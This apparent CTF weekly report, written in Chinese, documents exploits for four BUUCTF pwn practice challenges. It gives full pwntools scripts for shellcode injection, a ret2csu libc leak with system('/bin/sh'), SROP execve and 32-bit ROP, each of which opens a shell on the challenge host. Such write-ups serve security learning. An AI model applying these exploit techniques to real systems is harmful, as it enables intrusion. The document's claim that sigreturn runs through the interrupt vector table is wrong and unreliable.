# week5
# BUUCTF-picoctf_2018_shellcode
vuln函数输入shellcode

<img width="208" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/efecac50-593e-40ac-9877-1966868c3ed3">

返回到main函数后输入会被直接执行
### exp_PicoCTF_2018_shellcode.py
```python
from pwn import *
# p = process("./PicoCTF_2018_shellcode")
p = remote("node4.buuoj.cn",27464)
context.log_level = 'debug'
context.arch = 'i386'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

sc = asm(shellcraft.sh())

ru("Enter a string!\n")
sl(sc)

shell()
```


## jarvisoj_level5
栈溢出

<img width="273" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/7527ba93-aa8b-402b-b2cc-be09b691c222">

能够用来泄漏libc的函数只有write 但write函数需要3个参数 在64位下很少有传递3个参数的gadget

考虑通过ret2csu来调用write函数泄漏libc

### exp_level3_x64.py
```python
from pwn import *
# p = process("./level3_x64")
p = remote("node4.buuoj.cn",29777)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
libc = ELF('/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

write_got = 0x000000000600a58
vuln = 0x0000000004005E6
pop_rdi_ret = 0x00000000004006b3

offset = 136
csu1 = 0x000000000400690
csu2 = 0x0000000004006A6

# junk --> 0xdeadbeef rbx --> 0 rbp --> 1
# r12 --> call r13 --> rdx r14 --> rsi r15 --> edi

# 1.ret2csu --> leak libc
paylaod = b'A' * offset 
paylaod+= p64(csu2) + p64(0xdeadbeef) + p64(0) + p64(1) + p64(write_got)
paylaod+= p64(0x8) + p64(write_got) + p64(1)
paylaod+= p64(csu1) + p64(0) * 7 + p64(vuln)

ru("Input:\n")
raw_input("Ther")
sl(paylaod)

libc_write = u64(ru('\x7f').ljust(8, '\x00'))
success("libc_write ==> {}".format(hex(libc_write)))

libc_base = libc_write - libc.symbols["write"]
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + libc.search('/bin/sh').next()
success("libc_binsh ==> {}".format(hex(libc_binsh)))

# 2.system("/bin/sh")

paylaod = b'A' * offset + p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system)

ru("Input:\n")
raw_input("Ther")
sl(paylaod)

shell()
```


## BUUCTF-ciscn_2019_es_7
程序就调用了两个函数read和write 其中read函数明显存在溢出

<img width="657" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/cbdc640b-e59c-4f23-ba3c-2f6c20820a41">

在往上看到了几个gadget

<img width="510" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/d5ac323f-4d93-4b06-845e-1234051cc17e">

查了一下 系统调用号为15的是sigreturn

`sigreturn` 是一个系统调用（syscall），用于在 Unix/Linux 操作系统中从中断处理程序中返回到用户空间程序。当一个进程收到一个信号（signal）时，操作系统会暂停进程的执行，保存当前进程的状态信息，然后转而执行与该信号相关联的信号处理程序（signal handler）。当信号处理程序执行完毕后，操作系统会使用 `sigreturn` 将进程状态恢复到信号发生时的状态，然后再将进程恢复执行。

具体来说，在执行信号处理程序时，系统会将进程的当前上下文（包括程序计数器、栈指针等）保存在用户态栈（user stack）中，然后将栈指针指向信号处理程序的栈帧（stack frame）。当信号处理程序执行完毕时，系统会使用 `sigreturn` 恢复用户态栈中保存的进程上下文，并将栈指针恢复到信号发生时的位置，然后再将进程恢复执行。

需要注意的是，`sigreturn` 并不是一个常规的系统调用，它不是通过系统调用表（system call table）来执行的，而是通过中断向量表（interrupt vector table）来执行的。因此，`sigreturn` 的实现方式与常规的系统调用有所不同。

简单来说 我们可以在sigreturn前修改各寄存器的值 在sigreturn返回后 寄存器值就会恢复到我们修改的值

也就是说我们可以通过sigreturn来控制任意寄存器的值 那就好办了 直接调用execve("/bin/sh",0,0)就可以了

但我们还缺少"/bin/sh"字符串 所以可以先构造一个read函数来将"/bin/sh"字符串读入到程序中

```python
# 1.read(0, bss, 0x40)
frameExecve = SigreturnFrame() 
frameExecve.rax = 0
frameExecve.rdi = 0
frameExecve.rsi = bss
frameExecve.rdx = 0x40
frameExecve.rip = syscall_ret
frameExecve.rsp = bss+0x30

payload = b'A' * offset + p64(sigret) + p64(syscall_ret) 
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)
```

这里构造一个read(0, bss, 0x40)来调用read函数 因为是使用syscall去调用read(eax=0) 所以还涉及到一个返回的问题

syscall之后会有ret操作 这个ret需要重新返回到vuln函数中来再次调用read进行溢出，以此来执行execve

所以此时的栈顶就是我们的返回地址 一个比较简单的方法就是直接修改rsp寄存器 使其指向bss段中我们能控制输入的地址

```python
payload = b'/bin/sh\x00' + p64(0)*5 + p64(vuln)
raw_input("Ther")
sl(payload)
```

然后在read进行输入时 直接将vuln的地址放在保存的rsp寄存器的地址 此时syscall后的ret就会重新返回到vuln中

接下来再进行同样的操作调用execve即可

```python
# 2.execve("/bin/sh", 0, 0")
frameExecve = SigreturnFrame() 
frameExecve.rax = 59
frameExecve.rdi = bss
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_ret

payload = b'A' * offset + p64(sigret) + p64(syscall_ret)
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)
```

### exp_ciscn_2019_es_7.py
```python
from pwn import *
p = process("./ciscn_2019_es_7")
# p = remote("node4.buuoj.cn",29614)
context.log_level = 'debug'
context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

bss = 0x602000 - 0x500
vuln = 0x0000000004004ED

syscall_ret = 0x000000000400517
sigret = 0x0000000004004DA
leave_ret = 0x0000000000400537
offset = 16

# 1.read(0, bss, 0x40)
frameExecve = SigreturnFrame() 
frameExecve.rax = 0
frameExecve.rdi = 0
frameExecve.rsi = bss
frameExecve.rdx = 0x40
frameExecve.rip = syscall_ret
frameExecve.rsp = bss+0x30

payload = b'A' * offset + p64(sigret) + p64(syscall_ret) 
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)

payload = b'/bin/sh\x00' + p64(0)*5 + p64(vuln)
raw_input("Ther")
sl(payload)

# 2.execve("/bin/sh", 0, 0")
frameExecve = SigreturnFrame() 
frameExecve.rax = 59
frameExecve.rdi = bss
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_ret

payload = b'A' * offset + p64(sigret) + p64(syscall_ret)
payload+= str(frameExecve)

raw_input("Ther")
sl(payload)

shell()
```

## BUUCTF-cmcc_pwnme2
无限制栈溢出

<img width="267" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/caef0b84-ef45-46ed-8ba5-f140d183eb9d">

有两个add_home和add_flag函数 只要参数正确即可将flag路径拼接到string字符串中 最后再调用exec_string函数即可打印flag

<img width="426" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/4a06efb9-bc69-40a6-b7f6-8c1073216761">

<img width="291" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fcf4e05b-2672-4175-b520-d012d96de943">

由于是32位程序 通过栈传递参数 可以利用pop ret去做ROP

```python
payload = b'A'*off1 + p32(add_home_addr) + p32(pop_ret) + p32(0xdeadbeef)
payload+= p32(add_flag_addr) + p32(pop2_ret) + p32(0xCAFEBABE) + p32(0xABADF00D)
payload+= p32(exec_string)
```

但本题还有一个更简单的做法 在知道flag的路径后 可以直接通过gets函数去输入string 然后直接执行exec_string

```python
payload = b'A' * off1 + p32(gets_plt) + p32(exec_string) + p32(string)
```

### exp_pwnme2.py
```python
from pwn import *
# p = process("./pwnme2")
p = remote("node4.buuoj.cn",27879)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

string = 0x804A060
add_home_addr = 0x8048644
add_flag_addr = 0x8048682
main = 0x80486F8
exec_string = 0x80485CB

gets_plt = 0x8048440
pop_ret = 0x08048409
pop2_ret = 0x0804867f

off1 = 112

# payload = b'A'*off1 + p32(add_home_addr) + p32(pop_ret) + p32(0xdeadbeef)
# payload+= p32(add_flag_addr) + p32(pop2_ret) + p32(0xCAFEBABE) + p32(0xABADF00D)
# payload+= p32(exec_string)

payload = b'A' * off1 + p32(gets_plt) + p32(exec_string) + p32(string)

ru("Please input:\n")
raw_input("Ther")
sl(payload)

shell()
```









